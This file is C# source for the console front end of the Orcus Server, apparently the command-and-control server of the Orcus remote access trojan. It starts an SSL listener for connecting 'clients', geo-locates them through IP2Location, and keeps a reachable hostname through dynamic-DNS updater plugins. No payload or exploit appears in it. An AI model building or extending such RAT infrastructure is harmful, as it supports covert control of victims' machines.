using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using Fclp;
using NLog;
using NLog.Config;
using NLog.Layouts;
using NLog.Targets;
using Orcus.Server.Core;
using Orcus.Server.Core.Config;
using Orcus.Server.Core.Database;
using Orcus.Server.Core.Plugins;
using Orcus.Server.Core.UI;
using Orcus.Server.Core.Utilities;
using Orcus.Shared.Core;

namespace Orcus.Server.CommandLine
{
    internal class Program
    {
        private static readonly Logger Logger = LogManager.GetCurrentClassLogger();

        private static void Main(string[] args)
        {
            Thread.CurrentThread.Name = "Main";
            Console.Title = "Orcus Server";
            Directory.SetCurrentDirectory(Path.GetDirectoryName(Assembly.GetEntryAssembly().Location));

            InitializeLogger();

            var sqliteFile = new FileInfo("sqlite3.dll");
            if (!sqliteFile.Exists)
                File.WriteAllBytes(sqliteFile.FullName, Properties.Resources.sqlite3);

            var p = new FluentCommandLineParser<CommandLineSettings> {IsCaseSensitive = false};
            p.SetupHelp("?", "help", "h")
                .Callback(x =>
                {
                    Console.WriteLine();
                    foreach (var commandLineOption in p.Options)
                    {
                        string command = "\t";
                        if (commandLineOption.HasShortName)
                        {
                            command += commandLineOption.ShortName;
                            if (commandLineOption.HasLongName)
                                command += ":";
                        }

                        if (commandLineOption.HasLongName)
                            command += commandLineOption.LongName;

                        Console.WriteLine(command.PadRight(30, ' ') + commandLineOption.Description);
                    }
                    Console.WriteLine();
                });

            p.Setup(x => x.Settings)
                .As('c', "config")
                .SetDefault("settings.json")
                .WithDescription("Path to the settings file");

            p.Setup(x => x.Verbose)
                .As('v', "verbose")
                .SetDefault(false)
                .WithDescription("Activate the verbose mode");

            p.Setup(x => x.IpAddresses)
                .As('i', "ipAddresses")
                .WithDescription("IP-addresses to listen to. Format: ip:port e. g. 127.0.0.1:10134")
                .SetDefault(null);

            p.Setup(x => x.DatabasePath)
                .As('d', "database")
                .WithDescription("The path to the sql database")
                .SetDefault("database.sqlite");

            p.Setup(x => x.NoSettings)
                .As("ns")
                .WithDescription("Ignores the settings, just start with the given ip addresses. Requires -i -d -ssl");

            p.Setup(x => x.SslCertificatePath)
                .As("ssl")
                .WithDescription("The path to a ssl certificate");

            p.Setup(x => x.SslCertificatePassword)
                .As("sslpw")
                .WithDescription("The password of the given ssl certificate")
                .SetDefault("");

            p.Setup(x => x.ServerPassword)
                .As('p', "password")
                .WithDescription("The password the server should start with")
                .SetDefault("");

            var result = p.Parse(args);
            if (result.HasErrors)
            {
                Console.WriteLine(result.ErrorText);
                return;
            }

            if (result.HelpCalled)
                return;

            if (p.Object.Verbose)
                EnabledDebugForAllRules();

            var settingsFile = new FileInfo(p.Object.Settings);
            Settings settings = null;

            if (!p.Object.NoSettings)
            {
                if (settingsFile.Exists)
                {
                    if (p.Object.Verbose)
                        Logger.Info("Settings file found, loading it now");
                    settings = Settings.Load(settingsFile.FullName);
                }
                else
                {
                    if (!ConfigureSettings(out settings))
                    {
                        if (p.Object.Verbose)
                            Logger.Info("Configuring settings failed");
                        return;
                    }

                    if (p.Object.Verbose)
                        Logger.Info("Save settings");
                    settings.Save();
                }
            }

            var database = new DatabaseManager(p.Object.DatabasePath);
            if (p.Object.Verbose)
                Logger.Info("Loading database...");
            try
            {
                database.Load();
            }
            catch (Exception ex)
            {
                Logger.Error("Couldn't load database: " + ex.Message);
                return;
            }

            if (p.Object.Verbose)
                Logger.Info("Database loaded");

            var ipAddresses = new List<IpAddressInfo>();
            if (p.Object.IpAddresses != null)
                ipAddresses.AddRange(
                    p.Object.IpAddresses.Select(x => x.Split(':'))
                        .Select(x => new IpAddressInfo {Ip = x[0], Port = int.Parse(x[1])})
                        .ToList());

            if (settings != null)
                ipAddresses.AddRange(settings.IpAddresses);

            if (p.Object.Verbose)
                Logger.Info($"{ipAddresses.Count} IP addresses found");

            X509Certificate2 x509Certificate2;
            if (!string.IsNullOrEmpty(p.Object.SslCertificatePath))
                try
                {
                    x509Certificate2 = new X509Certificate2(p.Object.SslCertificatePath, p.Object.SslCertificatePassword);
                }
                catch (Exception ex)
                {
                    Logger.Error(
                        $"Failed to load the SSL certificate. Please change it or create a new one. Error details: {ex.Message}");
                    return;
                }
            else if (settings != null)
                try
                {
                    x509Certificate2 = new X509Certificate2(settings.SslCertificatePath, settings.SslCertificatePassword);
                }
                catch (Exception ex)
                {
                    Logger.Error(
                        $"Failed to load the SSL certificate. Please change it or create a new one. Error details: {ex.Message}");
                    return;
                }
            else
            {
                Console.WriteLine("SSL-Certificate is required");
                return;
            }

            UiManager.RegisterUiImplementation(new ConsoleUiImplementation());

            using (var server = new TcpServer(database, ipAddresses, x509Certificate2))
            {
                var blockListFile = new FileInfo("block-list.txt");
                if (blockListFile.Exists)
                    server.InitializeIpBlockList(blockListFile.FullName);
                else
                    TcpServer.WriteDefaultIpBlockList(blockListFile.FullName);

                EventHandler updateTitleEventHandler =
                    (sender, eventArgs) =>
                        Console.Title =
                            $"Orcus Server - [{server.Clients.Count} {(server.Clients.Count == 1 ? "Client" : "Clients")}, {server.Administrations.Count} {(server.Administrations.Count == 1 ? "Administration" : "Administrations")}]";

                server.ClientsChanged += updateTitleEventHandler;
                server.AdministrationsChanged += updateTitleEventHandler;
                if (!string.IsNullOrEmpty(p.Object.ServerPassword))
                    server.Password = p.Object.ServerPassword;
                else if (settings != null)
                    server.Password = settings.Password;
                else
                {
                    Logger.Error("You have to define a server password in order to start the server");
                    return;
                }

                if (settings != null && settings.IsGeoIpLocationEnabled)
                {
                    server.Ip2LocationEmailAddress = settings.Ip2LocationEmailAddress;
                    server.Ip2LocationPassword = settings.Ip2LocationPassword;
                }

                server.Start();
                if (settings?.UpdatePlugin != null)
                {
                    settings.UpdatePlugin.ServerStarted();
                    server.DnsHostName = settings.UpdatePlugin.Host;
                }

                AppDomain.CurrentDomain.UnhandledException += CurrentDomainOnUnhandledException;

                bool? isUpdateAvailable = null;

                if (settings == null || settings.IsAutomaticServerUpdateEnabled)
                {
                    try
                    {
                        if ((isUpdateAvailable = ServerUpdater.IsUpdateAvailable()) == true)
                            Logger.Info(
                                "A new update is available. Please type \"update\" for more information.");
                    }
                    catch (Exception)
                    {
                        // ignored
                    }
                }

                while (true)
                {
                    switch (Console.ReadLine()?.ToLowerInvariant())
                    {
                        case "update":
                            if (isUpdateAvailable != true) //we only search if we don't know if an update is available
                                try
                                {
                                    isUpdateAvailable = ServerUpdater.IsUpdateAvailable();
                                }
                                catch (Exception ex)
                                {
                                    Console.WriteLine("An error occurred while trying to search for updates: " + ex.Message);
                                    break;
                                }

                            if (isUpdateAvailable == false)
                                Console.WriteLine("No updates available");

                            else if (isUpdateAvailable == true)
                            {
                                Console.WriteLine("A new update is available. You can download it using this url: https://orcus.pw/orcusapp/OrcusServer.php?method=consolePackageDownload");
                                Console.WriteLine("To apply the update, extract the content of the downloaded archive to this directory and replace the files");
                            }
                            break;
                        case "setup updater":
                            if (settings == null)
                            {
                                Console.WriteLine("Can't setup updater without settings file");
                                break;
                            }

                            var oldUpdater = settings.UpdatePlugin;
                            var updater = SetupIpUpdater(settings);
                            if (updater != null)
                            {
                                oldUpdater?.Stop();
                                updater.ServerStarted();
                                server.DnsHostName = updater.Host;
                            }
                            break;
                        case "disable updater":
                            if (settings == null)
                            {
                                Console.WriteLine("The server was not started with settings");
                                break;
                            }

                            settings.IsDnsUpdaterEnabled = false;
                            if (settings.UpdatePlugin != null)
                            {
                                settings.UpdatePlugin?.Stop();
                                Console.WriteLine("Updater disabled and stopped");
                            }
                            Console.WriteLine("Updater was not enabled");
                            settings.Save();
                            break;
                        case "add ip":
                            var address = new IpAddressInfo
                            {
                                Ip = ConsoleHelper.ReadNotNullString("Please enter the ip address: "),
                                Port = ConsoleHelper.ReadInteger("Port (default is 10134): ")
                            };
                            server.AddListener(address);
                            if (settings != null)
                            {
                                settings.IpAddresses.Add(address);
                                settings.Save();
                            }
                            break;
                        case "remove ip":
                            if (settings == null)
                            {
                                Console.WriteLine("The server was not started with settings");
                                break;
                            }

                            Console.WriteLine(
                                "Please select the number of the ip address you want to remove. Type nothing to cancel");

                            for (int i = 0; i < settings.IpAddresses.Count; i++)
                            {
                                var ipAddress = settings.IpAddresses[i];
                                Console.WriteLine($"\t{i}\t\t{ipAddress.Ip}:{ipAddress.Port}");
                            }
                            var numberToRemove = Console.ReadLine();
                            int number;
                            if (!string.IsNullOrWhiteSpace(numberToRemove) && int.TryParse(numberToRemove, out number))
                            {
                                if (number >= 0 && settings.IpAddresses.Count > number)
                                {
                                    var ipAddress = settings.IpAddresses[number];
                                    if (ConsoleHelper.GetYesNo(false,
                                        $"Are you sure that you want to remove the listener {ipAddress.Ip}:{ipAddress.Port} ({number})?[y/N]"))
                                    {
                                        server.RemoveListener(ipAddress);
                                        settings.IpAddresses.Remove(ipAddress);
                                        settings.Save();
                                        Console.WriteLine("Ip address was removed successfully");
                                    }
                                }
                                else
                                    Console.WriteLine("The number is out of range");
                            }
                            break;
                        case "stop":
                            server.Stop();
                            if (settings != null)
                            {
                                Console.WriteLine("Saving settings...");
                                settings.Save();
                            }
                            return;
                        case "setup geoip":
                            if (settings == null)
                            {
                                Console.WriteLine("The server was not started with settings");
                                break;
                            }

                            if (SetupGeoLocationApi(settings))
                            {
                                settings.IsGeoIpLocationEnabled = true;
                                settings.Save();
                                server.Ip2LocationEmailAddress = settings.Ip2LocationEmailAddress;
                                server.Ip2LocationPassword = settings.Ip2LocationPassword;
                                server.ReloadGeoIpLocationService();
                            }
                            break;
                        case "enable geoip":
                            if (settings == null)
                            {
                                Console.WriteLine("The server was not started with settings");
                                break;
                            }

                            if (settings.IsGeoIpLocationEnabled)
                            {
                                Console.WriteLine("Geo ip is already enabled");
                                break;
                            }
                            settings.IsGeoIpLocationEnabled = true;
                            settings.Save();

                            server.Ip2LocationEmailAddress = settings.Ip2LocationEmailAddress;
                            server.Ip2LocationPassword = settings.Ip2LocationPassword;
                            server.ReloadGeoIpLocationService();
                            break;
                        case "disable geoip":
                            if (settings == null)
                            {
                                Console.WriteLine("The server was not started with settings");
                                break;
                            }

                            if (!settings.IsGeoIpLocationEnabled)
                            {
                                Console.WriteLine("Geo ip is already disabled");
                                break;
                            }

                            settings.IsGeoIpLocationEnabled = false;
                            settings.Save();
                            Console.WriteLine("Geo ip disabled. Please restart the server in order for the changes to take effect");
                            break;
                        case "help":
                            Console.WriteLine("\tadd ip\t\t\tAdd a new listener");
                            Console.WriteLine("\tremove ip\t\tRemove a new listener");
                            Console.WriteLine("\tsetup updater\t\tSetup a DNS updater");
                            Console.WriteLine("\tdisable updater\t\tDisable the current DNS updater");
                            Console.WriteLine("\tsetup geoip\t\tSetup a geo location database to locate clients");
                            Console.WriteLine("\tenable geoip\t\tEnable geo location");
                            Console.WriteLine("\tdisable geoip\t\tDisable geo location");
                            Console.WriteLine("\tupdate\t\t\tSearch and apply updates");
                            Console.WriteLine("\tstop\t\t\tSave everything and stop the server");
                            break;
                    }
                }
            }
        }

        private static void CurrentDomainOnUnhandledException(object sender,
            UnhandledExceptionEventArgs unhandledExceptionEventArgs)
        {
            Logger.Error("CRITICAL ERROR: " + unhandledExceptionEventArgs.ExceptionObject);
            Environment.Exit(0);
        }

        private static bool SetupGeoLocationApi(Settings settings)
        {
            Console.WriteLine("Please input your IP2Location credentials (you can sign up here for free: https://lite.ip2location.com/sign-up)");
            Console.Write("E-Mail address: ");
            var emailAddress = Console.ReadLine();
            if (string.IsNullOrEmpty(emailAddress))
            {
                Console.WriteLine("Canceled, you can setup it later using \"setup geoip\"");
                return false;
            }
            Console.Write("Password: ");
            var password = Console.ReadLine();
            if (string.IsNullOrEmpty(password))
            {
                Console.WriteLine("Canceled, you can setup it later using \"setup geoip\"");
                return false;
            }
            settings.Ip2LocationEmailAddress = emailAddress;
            settings.Ip2LocationPassword = password;
            return true;
        }

        private static bool ConfigureSettings(out Settings settings)
        {
            settings = new Settings();
            Console.WriteLine("Let's start configure the server!");

            var address = new IpAddressInfo
            {
                Ip = ConsoleHelper.ReadNotNullString("Please enter the ip address (you can add more later): "),
                Port = ConsoleHelper.ReadInteger("Port (default is 10134): ")
            };
            Console.WriteLine($"Nice, set address={address.Ip}:{address.Port}");
            settings.IpAddresses.Add(address);

            settings.Password = ConsoleHelper.ReadNotNullString("Please enter the password for the server: ");
            Console.WriteLine("Awesome. Now we need a SSL certificate");
            if (ConsoleHelper.GetYesNo(true, "Do you want to create a new certificate? [Y/n] "))
            {
                var subject = ConsoleHelper.ReadNotNullString("Subject: ");
                var password = ConsoleHelper.ReadNotNullString("Password (you don't have to remember it): ");

                var certificateFile = new FileInfo("certificate.pfx");
                if (certificateFile.Exists)
                    certificateFile.Delete();

                File.WriteAllBytes(certificateFile.FullName, PfxGenerator.GeneratePfx(subject, password));
                Console.WriteLine("X.509 (SSL) certificate successfully created: " + certificateFile.Name);

                settings.SslCertificatePath = certificateFile.Name;
                settings.SslCertificatePassword = password;
            }
            else
            {
                settings.SslCertificatePath =
                    ConsoleHelper.ReadNotNullString("Please enter the path to your certificate: ");
                while (true)
                {
                    settings.SslCertificatePassword =
                        ConsoleHelper.ReadNotNullString("and the password (leave empty if not set): ");
                    Console.WriteLine("Testing certificate...");
                    try
                    {
                        new X509Certificate2(File.ReadAllBytes(settings.SslCertificatePath),
                            settings.SslCertificatePassword);
                        Console.WriteLine("Awesome!");
                        break;
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Loading the certificate failed: {ex.Message}");
                    }
                }
            }

            if (ConsoleHelper.GetYesNo(true, "Do you want to setup a geo location database to locate clients [Y/n]?"))
            {
                if (SetupGeoLocationApi(settings))
                {
                    settings.IsGeoIpLocationEnabled = true;
                    Console.WriteLine("Awesome, you can change them later using \"setup geoip\"");
                }
            }

            if (ConsoleHelper.GetYesNo(false, "Do you want to enable an ip updater [y/N]? "))
                SetupIpUpdater(settings);

            Console.WriteLine("Let's start!");
            return true;
        }

        private static IUpdatePlugin SetupIpUpdater(Settings settings)
        {
            Console.WriteLine("Please select the updater type:");
            for (int i = 0; i < Settings.GetUpdatePlugins().Count; i++)
                Console.WriteLine($"{i}\t-\t{Settings.GetUpdatePlugins()[i].Name}");

            int updateType;
            while (true)
            {
                updateType = ConsoleHelper.ReadInteger();
                if (updateType == -1)
                {
                    Console.WriteLine("Canceled");
                    return null;
                }

                if (updateType < 0 || updateType >= Settings.GetUpdatePlugins().Count)
                {
                    Console.WriteLine(
                        $"Please select a number between 0-{Settings.GetUpdatePlugins().Count - 1} or -1 to cancel");
                    continue;
                }

                break;
            }

            var updater = Settings.GetUpdatePlugins()[updateType];
            if (updater.SetupConsole())
            {
                Console.WriteLine("Updater successfully initialized");
                settings.UpdatePlugin = updater;
                settings.IsDnsUpdaterEnabled = true;
                return updater;
            }

            Console.WriteLine("Failed to setup the updater");

            return null;
        }

        public static void EnabledDebugForAllRules()
        {
            foreach (var rule in LogManager.Configuration.LoggingRules)
            {
                rule.EnableLoggingForLevel(LogLevel.Debug);
            }

            //Call to update existing Loggers created with GetLogger() or 
            //GetCurrentClassLogger()
            LogManager.ReconfigExistingLoggers();
        }

        private static void InitializeLogger()
        {
            NLogUtils.CreateConfigFileIfNotExists();

            SimpleLayout simpleLayout;
            var layout = LogManager.Configuration.Variables.TryGetValue("TextBoxLayout", out simpleLayout)
                ? simpleLayout.Text
                : "${date:format=HH\\:MM\\:ss.ffff} [${level:upperCase=true}]\t[${logger:shortName=true}] ${message}";

            var minLogLevel = LogManager.Configuration.Variables.TryGetValue("MinLogLevel", out simpleLayout)
                ? LogLevel.FromString(simpleLayout.Text)
                : LogLevel.Info;

            var reconfigLoggers = false;

            var fileTarget = LogManager.Configuration.FindTargetByName<FileTarget>("file");
            if (fileTarget != null && LogManager.Configuration.Variables.TryGetValue("VerboseLayout", out simpleLayout))
            {
                simpleLayout.Text = simpleLayout.Text.Replace("${callsite", "${callsite:skipFrames=3");
                fileTarget.Layout = simpleLayout;
                reconfigLoggers = true;
            }

            var target = new ColoredConsoleTarget { Layout = layout, Name = "console" };
            LogManager.Configuration.LoggingRules.Add(new LoggingRule("*", minLogLevel, target));

            LogManager.Configuration.Reload(); //important, refreshes the config

            if (reconfigLoggers)
                LogManager.ReconfigExistingLoggers();
        }
    }
}